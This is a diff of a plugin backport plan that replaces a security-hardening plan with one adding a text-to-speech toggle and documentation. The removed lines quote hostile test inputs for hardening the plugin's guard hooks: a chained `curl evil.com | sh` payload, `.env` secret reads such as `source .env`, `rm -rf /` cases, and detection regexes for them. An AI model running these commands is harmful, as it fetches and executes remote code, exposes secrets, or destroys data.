@@ -1,223 +1,209 @@
-# Plan: Backport agent-harness fixes & enhancements from aif-skills
+# Plan: Backport agent-harness fixes from aif-skills (work) to boss-skills (personal)
 
 ## Context
 
-`plugins/boss-dev/agent-harness` in **boss-skills** is the upstream original. The Adobe fork
-`/Users/bossjones/dev/aif-skills/plugins/agent-harness` (also v0.3.0) was hardened over the last
-week with several **security fixes, reliability fixes, plugin-portability fixes, and three new
-commands** that were never reflected back here. This plan backports those substantive improvements
-into boss-skills while keeping boss-skills' identity (author, repo URLs, the 9-status-line library)
-and excluding Adobe-specific bits (Adobe pricing, `malcolm@adobe.com`, AIFoundations URLs) and the
-pure-cosmetic refactor churn.
+`/Users/bossjones/dev/adobe-aifoundations/aif-skills` is the Adobe-work mirror of this
+personal repo. The `agent-harness` plugin has diverged in both directions:
 
-**Source of truth for each change:** the corresponding file under
-`/Users/bossjones/dev/aif-skills/plugins/agent-harness/` (referred to below as `$AIF`).
-**Target:** `/Users/bossjones/dev/bossjones/boss-skills/plugins/boss-dev/agent-harness/` (`$BOSS`).
+- **boss-skills is newer overall** — v0.10.0 vs work's v0.5.0; it already has tmux desktop
+  notifications, a `hooks/tests/` suite, and extra skills/commands the work repo lacks.
+  (An earlier backport already brought over hooks.json wiring, the commit-push-pr/debug-ci/
+  fix-gh-pr-comments commands, the security/reliability hook fixes, and status_line_v10 with
+  public pricing.)
+- **aif-skills diverged on two genuinely useful things** that never made it back:
+  1. **TTS configurability.** Work added a shared `hooks/utils/config.py` resolver and a
+     `tts_enabled()` gate wired into the three TTS-emitting hooks, plus `ENABLE_TTS` /
+     `ENGINEER_NAME` plugin user-config options. **boss-skills currently cannot disable
+     TTS at all** — `notification.py`, `stop.py`, and `subagent_stop.py` always attempt to
+     speak. This is the core fix.
+  2. **A `docs/` suite** — 8 markdown guides documenting the plugin's commands, agents,
+     skills, hooks, output styles, status lines, and workflows.
 
-### Decisions (confirmed with user)
-1. **Wire hooks** — add `hooks/hooks.json` to auto-activate all 13 lifecycle hooks on install, TTS on (full port).
-2. **Engineer name** — adopt `ENGINEER_NAME` env var but **fall back to `"bossjones"`** when unset (not aif's generic fallback).
-3. **Status line** — **add** `status_line_v10.py` alongside the existing v1–v9, using **generic/public Claude pricing** (not Adobe pricing). Do not delete v1–v9.
-4. **Scope** — **substantive fixes + new commands + command-reference qualification only.** Skip the cosmetic `open(...,"r")`/`Optional`→`|`/multi-line-argparse churn.
+Everything else in the work repo is either work-specific drift that must **not** come over
+(Adobe-discounted pricing in `status_line_v10.py`, `malcolm@adobe.com` author/URLs in
+`plugin.json`, `setup-gh-mcp` / `setup-repos` Makefile targets, `settings.local.json`
+paths, README plugin catalogs) or already superseded in boss-skills.
+
+**Outcome:** boss-skills' agent-harness gains a clean, env-driven TTS on/off switch
+(without losing its tmux features) and a documentation suite, branded for boss-skills.
 
 ## Objective
 
-boss-skills' agent-harness gains: (a) two confirmed security fixes, (b) two reliability/race fixes,
-(c) plugin-relative path resolution, (d) hooks auto-wired on install, (e) three new orchestration
-commands (`commit-push-pr`, `debug-ci`, `fix-gh-pr-comments`), (f) removal of the dead `cook`
-command, (g) qualified cross-command references, (h) portable engineer-name handling, and (i) an
-optional `status_line_v10`. Plugin version bumps 0.3.0 → 0.4.0 with marketplace parity.
+1. Add `ENABLE_TTS` / `ENGINEER_NAME` configurability to the boss-skills agent-harness
+   plugin via a shared `hooks/utils/config.py`, gating TTS in all three TTS hooks.
+2. Add the 8-file `docs/` suite, rewritten for boss-skills (no Adobe references, correct
+   `plugins/boss-dev/agent-harness` paths, bossjones marketplace/URLs).
+3. Extend the existing hook test suite to cover the TTS toggle.
+4. Bump the plugin version and sync `marketplace.json`.
 
 ## Problem Statement
 
-Five concrete defects + gaps exist in boss-skills today (confirmed by diffing the two trees):
-
-- **SEC-1 (permission_request.py):** `is_safe_bash_command()` only inspects the first command, so an
-  auto-allowed prefix lets a chained payload through (`ls; curl evil.com | sh`). Also `git branch|tag`
-  auto-allows destructive flags like `git branch -D`.
-- **SEC-2 (pre_tool_use.py):** the `.env` guard's `\b\.env\b` patterns miss whitespace-preceded dots
-  (`source .env`, `less .env`, `vi .env`) — secrets can be read. `.env.example` is also not allowlisted.
-- **REL-1 (tts_queue.py):** `release_tts_lock()` clears the lock file *after* `LOCK_UN`, a race that
-  blanks the next holder's metadata under contention.
-- **REL-2 (pre_tool_use.py):** the `rm -rf` dangerous-path patterns are over-broad (flag benign
-  `rm -r ./build/output`) and simultaneously miss `rm -rf / home/user` (root as a separate arg).
-- **PORT-1 (user_prompt_submit.py + tts_queue.py):** hardcoded `.claude/hooks/utils/llm/...` paths and
-  parent-walking lock dir break when the code runs from the plugin tree instead of project `.claude/`.
-- **WIRE-1:** boss-skills has **no `hooks.json` and no `hooks` key in plugin.json** — every hook ships
-  inert. aif wired them.
-- **CMD-1:** `cook.md` dispatches non-existent `crypto-*` agents (dead demo). aif removed it and added
-  three real commands; cross-command references aren't `agent-harness:`-qualified here.
+The personal agent-harness plugin has no way to silence TTS. On machines without audio,
+in CI, or during focus time, `notification.py` / `stop.py` / `subagent_stop.py` always
+shell out to the TTS backend (failing silently, but still spawning `uv run` subprocesses
+on every Stop/Notification). The work repo already solved this cleanly with a single
+env-driven switch and a reusable config resolver; that improvement should live in the
+canonical personal repo too. Secondarily, the plugin lacks end-user documentation that the
+work fork has since written.
 
 ## Solution Approach
 
-Port each fix from `$AIF` by reproducing the *logic delta only* (not the cosmetic delta) into `$BOSS`.
-Every required skill the new commands depend on (`fetch-diff`, `fetch-unresolved-comments`,
-`add-review-comment`, `pr-review`, `git-worktree*`) already exists in boss-skills, so the new commands
-work with no extra dependencies. Finish with a version bump (`version-bump-reviewer` skill) and
-`make lint && make test`.
+Port the **mechanism**, not the work-specific config values. Add `hooks/utils/config.py`
+(identical to work — it's environment-neutral), refactor the three TTS hooks to import
+`tts_enabled()` / `engineer_name()` with an inline fallback (so the hooks still run if the
+module is ever missing), and **merge** `ENABLE_TTS` + `ENGINEER_NAME` into the existing
+`userConfig` block alongside the current `tmux_notifications` options (do not overwrite).
+Port the docs as new files with branding/paths rewritten. Cover the toggle with a test in
+the existing `hooks/tests/` suite. Finish with a version bump + marketplace sync.
 
 ## Relevant Files
 
-Modify (logic-only ports from the matching `$AIF` file):
-- `$BOSS/hooks/permission_request.py` — SEC-1: add the shell-operator rejection block + split the
-  `git branch|tag` rule into bare-listing-only; surface `reason` in `create_allow_response`.
-- `$BOSS/hooks/pre_tool_use.py` — SEC-2 + REL-2: replace the dangerous-path list with the
-  whole-argument patterns and the `.env` detection with the single lookbehind pattern
-  `(?<![\w.])\.env(?![\w])(?!\.sample)(?!\.example)`; allowlist `.env.example`.
-- `$BOSS/hooks/utils/tts/tts_queue.py` — REL-1 + PORT-1: `os.ftruncate(fd, 0)` before `LOCK_UN`
-  (drop the post-release `open(...,"w")` clear); change `_LOCK_DIR` to CWD-relative
-  `Path(".claude") / "data" / "tts_queue"`.
-- `$BOSS/hooks/user_prompt_submit.py` — PORT-1: resolve LLM helpers via
-  `Path(__file__).parent / "utils" / "llm"` instead of literal `.claude/hooks/...` strings.
-- `$BOSS/hooks/utils/llm/task_summarizer.py`, `$BOSS/agents/work-completion-summary.md`,
-  `$BOSS/output-styles/tts-summary.md` — engineer-name: read `ENGINEER_NAME`, **fallback `"bossjones"`**.
-- `$BOSS/hooks/notification.py`, `stop.py`, `subagent_start.py`, `subagent_stop.py` — correct the
-  false "ElevenLabs > OpenAI > pyttsx3" TTS-priority docstrings to reflect pyttsx3-only reality.
-- `$BOSS/commands/autobuild.md`, `plan_w_team.md`, `update_status_line.md` — qualify intra-plugin
-  command references with the `agent-harness:` prefix.
-- `$BOSS/.claude-plugin/plugin.json` + `$BOSS/../../../.claude-plugin/marketplace.json` — version 0.4.0.
+Source (read-only, work repo):
+- `…/aif-skills/plugins/agent-harness/hooks/utils/config.py` — the module to copy verbatim.
+- `…/aif-skills/plugins/agent-harness/hooks/{notification,stop,subagent_stop}.py` — show the
+  exact `tts_enabled()` import + gate pattern to replicate.
+- `…/aif-skills/plugins/agent-harness/docs/*.md` — 8 source docs to adapt.
+- `…/aif-skills/plugins/agent-harness/.claude-plugin/plugin.json` — source of the
+  `ENABLE_TTS` / `ENGINEER_NAME` userConfig schema.
 
-### New Files (copy from `$AIF`, scrub Adobe-isms)
-- `$BOSS/hooks/hooks.json` — copy verbatim (already Adobe-free; uses `${CLAUDE_PLUGIN_ROOT}`).
-- `$BOSS/commands/commit-push-pr.md`, `$BOSS/commands/debug-ci.md`, `$BOSS/commands/fix-gh-pr-comments.md` — copy verbatim (verified Adobe-free).
-- `$BOSS/status_lines/status_line_v10.py` — copy, then replace the `ADOBE_PRICING` table with public Claude list pricing and rename the constant (e.g. `MODEL_PRICING`).
+Target (boss-skills — to modify/create):
+- `plugins/boss-dev/agent-harness/hooks/utils/config.py` — **NEW** (copy).
+- `plugins/boss-dev/agent-harness/hooks/notification.py` — gate `announce_notification()`.
+- `plugins/boss-dev/agent-harness/hooks/stop.py` — gate TTS announcement.
+- `plugins/boss-dev/agent-harness/hooks/subagent_stop.py` — gate TTS announcement.
+- `plugins/boss-dev/agent-harness/.claude-plugin/plugin.json` — merge 2 userConfig keys;
+  this is also the version-bump artifact.
+- `plugins/boss-dev/agent-harness/docs/*.md` — **NEW** (8 adapted files).
+- `plugins/boss-dev/agent-harness/hooks/tests/` — **NEW** test for the toggle.
+- `.claude-plugin/marketplace.json` — sync the agent-harness version entry.
 
-### Delete
-- `$BOSS/commands/cook.md` — dead `crypto-*` demo.
-
-## Implementation Phases
-
-### Phase 1: Security & reliability fixes (highest priority)
-SEC-1, SEC-2, REL-1, REL-2, PORT-1 — the five hook-script logic ports. These stand alone and are
-valuable even if hooks stay inert.
-
-### Phase 2: Wiring, commands, and portability
-Add `hooks.json`; add the three commands; delete `cook.md`; qualify command references; engineer-name
-handling; TTS docstring corrections.
-
-### Phase 3: Enhancement, version, validation
-Add `status_line_v10.py` (generic pricing); bump version + marketplace parity; run lint/tests; smoke-test.
+Explicitly **out of scope** (do not touch / do not copy):
+- `status_lines/status_line_v10.py` — boss-skills already has correct public list pricing;
+  work's `ADOBE_PRICING` must never be backported.
+- `plugin.json` author/email/url/homepage/repository/keywords — keep boss-skills values.
+- `setup-agent-harness` skill, `setup-gh-mcp`/`setup-repos` Makefile targets,
+  `settings.local.json`, README plugin catalogs — work-specific.
+- `pre_compact.py` — the only diff is argparse line-wrapping (style drift); boss-skills'
+  one-line form already passes `ruff format`. No change.
 
 ## Step by Step Tasks
 IMPORTANT: Execute every step in order, top to bottom.
 
-### 1. Port SEC-1 (permission_request.py)
-- In `$BOSS/hooks/permission_request.py`, inside `is_safe_bash_command()`, after `normalized` is
-  computed, add: `if any(op in normalized for op in (";", "&&", "||", "|", "&", "`", "$(", ">", "<", "\n")): return False`.
-- Replace the `r"^git\s+(status|log|diff|show|branch|tag)\b"` entry with the two-line aif version:
-  `r"^git\s+(status|log|diff|show)\b"` and `r"^git\s+(branch|tag)\s*$"` (bare listing only).
-- In `create_allow_response`, append `reason` to the decision dict when provided (the aif `if reason:` block).
+### 1. Persist this spec
+- Copy this document to `specs/backport-agent-harness-fixes-from-aif-skills.md`. (done)
 
-### 2. Port SEC-2 + REL-2 (pre_tool_use.py)
-- Replace the `dangerous_patterns` path list with aif's whole-argument anchored patterns
-  (`\s/\s*$`, `\s/\s+`, `\s/\*`, `\s~\s*$`, `\s~/`, `\$home\b`, `\.\.`, `\s\*\s*$`, `\s\./?\s*$`).
-- Replace the Write/Edit `.env` check to allow both templates:
-  `if ".env" in file_path and not file_path.endswith((".env.sample", ".env.example")):`.
-- Replace the multi-pattern `.env` bash detection with the single pattern
-  `r"(?<![\w.])\.env(?![\w])(?!\.sample)(?!\.example)"`.
+### 2. Add the shared config resolver
+- Create `plugins/boss-dev/agent-harness/hooks/utils/config.py` as a verbatim copy of the
+  work file: `_option()` (reads `CLAUDE_PLUGIN_OPTION_<KEY>`, falls back to bare env var),
+  `tts_enabled()` (default True unless value in `{0,false,no,off}`), `engineer_name()`.
+- Confirm `hooks/utils/` is importable as a package the same way work imports it
+  (`sys.path.insert(0, str(Path(__file__).parent))` then `from utils.config import …`).
 
-### 3. Port REL-1 + PORT-1 (tts_queue.py)
-- Change `_LOCK_DIR` to `Path(".claude") / "data" / "tts_queue"` (drop the `_SCRIPT_DIR`/`_PROJECT_ROOT` parent-walk).
-- In `release_tts_lock()`, `os.ftruncate(_lock_file_handle, 0)` (guarded by `try/except OSError`)
-  **before** `fcntl.flock(..., LOCK_UN)`, and delete the later `open(_LOCK_FILE, "w")` clear block.
+### 3. Gate TTS in notification.py
+- At top of `notification.py`, add the import-with-fallback block (mirror work):
+  `sys.path.insert(0, str(Path(__file__).parent))` then
+  `try: from utils.config import engineer_name, tts_enabled` with an `except ImportError`
+  defining inline equivalents.
+- In `announce_notification()`, add `if not tts_enabled(): return` as the first line.
+- Replace inline `engineer_name = os.getenv("ENGINEER_NAME", "").strip()` with
+  `engineer_name_val = engineer_name()` and update the f-string usage accordingly.
 
-### 4. Port PORT-1 (user_prompt_submit.py)
-- Add `llm_dir = Path(__file__).parent / "utils" / "llm"` near the top of the agent-naming function.
-- Replace `".claude/hooks/utils/llm/ollama.py"` → `str(llm_dir / "ollama.py")` and the `anth.py` equivalent.
+### 4. Gate TTS in stop.py and subagent_stop.py
+- Apply the same import-with-fallback block and `if not tts_enabled(): return` guard inside
+  each file's TTS-announcement function. Use `subagent_stop.py`/`stop.py` from work as the
+  reference for the exact insertion point.
 
-### 5. Engineer-name handling (ENGINEER_NAME, fallback "bossjones")
-- In `task_summarizer.py`, build the user-address from `os.environ.get("ENGINEER_NAME", "bossjones")`.
-- In `agents/work-completion-summary.md` and `output-styles/tts-summary.md`, replace the literal
-  "bossjones" address with the same env-var-with-`bossjones`-fallback wording (mirror aif's dynamic
-  phrasing but keep `bossjones` as the default name).
+### 5. Merge userConfig in plugin.json
+- Into the existing `userConfig` object (which currently holds `tmux_notifications`,
+  `tmux_notify_activate_bundle_id`, `tmux_notify_sound`), **add** without removing:
+  - `ENABLE_TTS` — boolean, title "Enable spoken announcements (TTS)", description noting
+    it silences Stop/SubagentStop/Notification TTS, `default: true`.
+  - `ENGINEER_NAME` — string, title "Your name", used in ~30% of spoken messages,
+    `default: ""` (keep boss-skills' blank-default convention, not work's "Friend").
+- Keep all other boss-skills fields (author, urls, keywords, version) unchanged here except
+  the version bump in step 8.
 
-### 6. Correct TTS docstrings
-- In `notification.py`, `stop.py`, `subagent_start.py`, `subagent_stop.py`, fix the
-  `get_tts_script_path()` docstrings that falsely claim ElevenLabs>OpenAI>pyttsx3 priority — state the
-  actual pyttsx3-only behavior (copy aif's corrected text).
+### 6. Add docs/ suite (boss-skills branded)
+- Create `plugins/boss-dev/agent-harness/docs/{getting-started,commands,agents,skills,hooks,output-styles,status-lines,workflows}.md`
+  from the work originals.
+- Rewrite during copy: replace `Adobe-AIFoundations/aif-skills` → `bossjones/boss-skills`,
+  `malcolm@adobe.com` → boss-skills author, `plugins/agent-harness` →
+  `plugins/boss-dev/agent-harness`, and the marketplace/install name to the boss-skills
+  marketplace. Reconcile counts/feature lists with what boss-skills actually ships
+  (boss-skills has extra skills: stop-slop, unicode-hygiene, worktree-doctor; extra
+  commands; tmux notification hooks + StopFailure) and document `ENABLE_TTS`/`ENGINEER_NAME`
+  in `hooks.md`/`getting-started.md`.
+- Follow the repo SKILL.md parser caveat (no leading-backtick command patterns in fenced
+  blocks; use `$ command` notation) for any executable examples.
 
-### 7. Add hooks.json
-- Copy `$AIF/hooks/hooks.json` to `$BOSS/hooks/hooks.json` verbatim (uses `${CLAUDE_PLUGIN_ROOT}`,
-  no Adobe refs). This activates all 13 hooks incl. TTS (`--notify`/`--chat`) and ruff auto-format on edits.
+### 7. Add a test for the TTS toggle
+- In `plugins/boss-dev/agent-harness/hooks/tests/`, add a test (matching the existing test
+  style there) that imports `utils.config` and asserts:
+  - `tts_enabled()` is True by default and with `ENABLE_TTS` unset.
+  - `tts_enabled()` is False for each of `0/false/no/off` (case-insensitive) via both
+    `ENABLE_TTS` and `CLAUDE_PLUGIN_OPTION_ENABLE_TTS`.
+  - `engineer_name()` reads the option and trims whitespace; empty when unset.
+- Use `monkeypatch.setenv`/`delenv`. Keep it stdlib + pytest; no network, no audio.
 
-### 8. Add new commands, remove cook
-- Copy `commit-push-pr.md`, `debug-ci.md`, `fix-gh-pr-comments.md` from `$AIF/commands/` to `$BOSS/commands/`.
-- `git rm` (or delete) `$BOSS/commands/cook.md`.
-- Grep the three new files for any `aif`/`adobe`/absolute-path references and scrub if found (initial scan found none).
+### 8. Version bump + marketplace sync
+- Run the `version-bump-reviewer` skill against the change (or apply manually): this is a
+  plugin-component change → bump `plugins/boss-dev/agent-harness/.claude-plugin/plugin.json`
+  `version` and the matching `.claude-plugin/marketplace.json` entry. New backward-compatible
+  feature (TTS toggle + docs) → **minor** bump (0.10.0 → 0.11.0).
 
-### 9. Qualify cross-command references
-- In `autobuild.md`, `plan_w_team.md`, `update_status_line.md`, prefix intra-plugin command mentions
-  with `agent-harness:` (e.g. `/commit-push-pr` → `/agent-harness:commit-push-pr`), matching aif.
-
-### 10. Add status_line_v10.py (generic pricing)
-- Copy `$AIF/status_lines/status_line_v10.py` to `$BOSS/status_lines/status_line_v10.py`.
-- Replace the `ADOBE_PRICING` dict with public Anthropic list pricing per 1M tokens
-  (Haiku 4.5, Sonnet 4.x, Opus 4.x — input/output) and rename the constant to `MODEL_PRICING`;
-  keep cache multipliers (1.25 creation / 0.10 read). **Do not delete v1–v9.**
-
-### 11. Version bump + marketplace parity
-- Bump `$BOSS/plugins/boss-dev/agent-harness/.claude-plugin/plugin.json` `version` 0.3.0 → **0.4.0**
-  (minor: new commands + hooks wiring + status line, backward compatible).
-- Bump the matching `agent-harness` entry in `$BOSS/.claude-plugin/marketplace.json` to `0.4.0`.
-- Prefer running the `version-bump-reviewer` skill to confirm the tier and produce the conventional commit.
-
-### 12. Validate
-- Run the Validation Commands below; fix any lint/test failures before declaring done.
+### 9. Validate
+- Run the validation commands below and confirm all pass.
 
 ## Testing Strategy
 
-- **Lint/type/format:** `make lint` must pass (ruff + basedpyright over `plugins/`). Skipping cosmetic
-  churn means a few `open(...,"r")` remain — acceptable unless ruff's configured ruleset flags them; if
-  it does (e.g. `UP015`), apply that single auto-fix locally to the touched files only.
-- **Hook unit behavior (manual, targeted):**
-  - SEC-1: pipe `{"tool_name":"Bash","tool_input":{"command":"ls; curl evil.com | sh"}}` into
-    `permission_request.py --auto-allow` → must NOT auto-allow.
-  - SEC-2: pipe a `Bash` `source .env` event into `pre_tool_use.py` → exit code 2 (blocked); confirm
-    `cat .env.example` is allowed.
-  - REL-2: confirm `rm -r ./build/output` is allowed while `rm -rf /` and `rm -rf / home/user` block.
-- **Skill tests:** `make test` (existing `fetch-diff` / `fetch-unresolved-comments` / `pr-review`
-  pytest suites must stay green — these files are not touched logically).
-- **Install smoke test:** with `hooks.json` present, confirm Claude Code discovers the plugin hooks
-  (no JSON parse error) and the three new commands appear as `/agent-harness:commit-push-pr` etc.
+- **Unit:** new `hooks/tests/` test exercises `tts_enabled()` / `engineer_name()` across
+  truthy/falsy/case-variant/prefixed-env inputs (the core of the fix).
+- **Behavioral smoke:** with `ENABLE_TTS=false`, run a hook that announces (e.g. pipe a
+  minimal JSON event into `stop.py`) and confirm no TTS subprocess is spawned and exit 0;
+  with `ENABLE_TTS` unset confirm the prior behavior (subprocess attempted, fails silently
+  if no audio) still exits 0.
+- **Regression:** existing `make test-agent-harness` suite continues to pass (the
+  fallback-import block guarantees hooks run even if `utils/config.py` is absent).
+- **Edge cases:** `ENABLE_TTS` with surrounding whitespace / mixed case; both
+  `CLAUDE_PLUGIN_OPTION_ENABLE_TTS` and bare `ENABLE_TTS` set (option wins);
+  `utils/config.py` missing (fallback path).
 
 ## Acceptance Criteria
 
-- SEC-1, SEC-2, REL-1, REL-2, PORT-1 logic in `$BOSS` matches the corresponding `$AIF` logic.
-- `$BOSS/hooks/hooks.json` exists and is valid JSON registering all 13 events.
-- `commit-push-pr.md`, `debug-ci.md`, `fix-gh-pr-comments.md` exist; `cook.md` is gone.
-- Cross-command references in the three edited command files are `agent-harness:`-qualified.
-- Engineer-name strings resolve from `ENGINEER_NAME` with a `"bossjones"` fallback.
-- `status_line_v10.py` exists with generic Claude pricing; v1–v9 untouched.
-- `plugin.json` and `marketplace.json` both read `0.4.0`.
-- No Adobe-specific identifiers (`adobe`, `AIFoundations`, `malcolm@adobe.com`, Adobe pricing) introduced.
-- `make lint` and `make test` pass.
+- `plugins/boss-dev/agent-harness/hooks/utils/config.py` exists with `tts_enabled()` /
+  `engineer_name()` and no Adobe-specific content.
+- All three TTS hooks return early (no subprocess) when `ENABLE_TTS` is falsy and behave as
+  before otherwise.
+- `plugin.json` `userConfig` contains `ENABLE_TTS` and `ENGINEER_NAME` **and** retains the
+  three `tmux_*` options; author/urls/keywords unchanged.
+- 8 docs exist under the plugin's `docs/`, with zero `Adobe`/`aif-skills`/`malcolm` strings
+  and correct `plugins/boss-dev/agent-harness` paths.
+- New toggle test passes; full agent-harness test suite passes.
+- Plugin version bumped (minor) and equal in `plugin.json` and `marketplace.json`.
+- No changes to `status_line_v10.py` pricing.
 
 ## Validation Commands
 
-- `python3 -c "import json,sys; json.load(open('plugins/boss-dev/agent-harness/hooks/hooks.json'))"` — hooks.json is valid JSON
-- `ls plugins/boss-dev/agent-harness/commands/ | grep -E 'commit-push-pr|debug-ci|fix-gh-pr-comments'` — new commands present
-- `! test -e plugins/boss-dev/agent-harness/commands/cook.md` — cook removed
-- `grep -R "agent-harness:commit-push-pr" plugins/boss-dev/agent-harness/commands/` — references qualified
-- `grep -RniE 'adobe|aifoundations|malcolm@adobe' plugins/boss-dev/agent-harness/ ; test $? -ne 0` — no Adobe leakage
-- `grep '"version": "0.4.0"' plugins/boss-dev/agent-harness/.claude-plugin/plugin.json .claude-plugin/marketplace.json` — version parity
-- `make lint` — ruff + basedpyright clean
-- `make test` — pytest suites green
+- `make lint` — ruff + basedpyright clean (covers `plugins/`).
+- `make test-agent-harness` — agent-harness skills + hooks tests pass.
+- `uv run pytest plugins/boss-dev/agent-harness/hooks/tests/ -v` — including the new toggle test.
+- `ENABLE_TTS=false uv run plugins/boss-dev/agent-harness/hooks/stop.py < /dev/null; echo "exit=$?"`
+  — exits 0, no TTS subprocess (manual smoke; supply a minimal JSON event if the hook
+  requires one on stdin).
+- `! grep -rIl -e Adobe -e aif-skills -e malcolm plugins/boss-dev/agent-harness/docs/`
+  — returns nothing (no leaked work branding).
+- `grep -c ENABLE_TTS plugins/boss-dev/agent-harness/.claude-plugin/plugin.json` — ≥1, and
+  `tmux_notifications` still present.
+- `make markdown-lint` — docs lint clean.
+- Confirm version parity: `plugin.json.version` == agent-harness entry in
+  `.claude-plugin/marketplace.json`.
 
 ## Notes
 
-- **Why minor, not patch:** the bug fixes alone would be a patch, but adding three commands + wiring
-  hooks introduces new user-facing features → 0.4.0. Confirm with `version-bump-reviewer`.
-- **Behavior change to flag in commit body:** with `hooks.json` now present, installing the plugin
-  activates the `rm -rf`/`.env` guards, permission auto-allow logging, TTS announcements, and ruff
-  auto-format on `.py` edits. This is intended (per decision 1) but should be called out in the
-  changelog/PR so installers aren't surprised by audio or auto-formatting.
-- **Excluded by decision 4:** the ~18-file cosmetic refactor (`open` mode, `Optional`→`|`, multi-line
-  argparse) and the Adobe identity/pricing changes are intentionally NOT ported.
-- **No new dependencies** — all new commands reuse skills already present in boss-skills.
-
-## Source Commits (aif-skills, for reference during execution)
-- `f5b9091` — plugin-relative path resolution (user_prompt_submit.py, tts_queue.py) [PORT-1]
-- `f4d8ff1` — remove upstream leftovers: compound-command security fix, ENGINEER_NAME, TTS docstrings [SEC-1, engineer-name]
-- `10175cd` — .env detection + race-free TTS lock release [SEC-2, REL-1]
-- `2763197` — qualified command refs, surface auto-allow reason, removed cook.md, added 3 commands [CMD-1, SEC-1 reason]
-- `0daae43` — wire lifecycle hooks via hooks.json [WIRE-1]
+- **Direction matters:** this is a *selective* backport. boss-skills is the newer trunk for
+  most of agent-harness; only TTS-config and docs flow work→personal. Do not let work's
+  older `notification.py`/`stop.py` bodies, status-line pricing, or manifest identity
+  overwrite the newer boss-skills versions — apply only the additive TTS gate.
+- No new third-party dependencies. `config.py` and the test are stdlib-only.
+- The fallback-import block is intentional defensive design from the source; keep it so a
+  packaging mishap can't break hook execution.
